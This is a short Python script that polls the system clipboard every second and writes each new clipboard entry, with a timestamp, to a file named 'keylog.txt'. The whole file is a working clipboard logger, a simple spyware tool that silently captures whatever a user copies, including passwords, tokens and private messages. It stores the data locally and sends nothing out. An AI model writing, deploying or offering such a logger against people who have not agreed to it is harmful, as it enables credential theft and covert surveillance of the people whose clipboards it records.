from contextlib import nullcontext
import pyperclip
import logging
import time

text = nullcontext
delayTime = 1 #in seconds
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

while True:
    if (pyperclip.paste() != text):
        text = pyperclip.paste()
        logging.info(text)
    time.sleep(delayTime)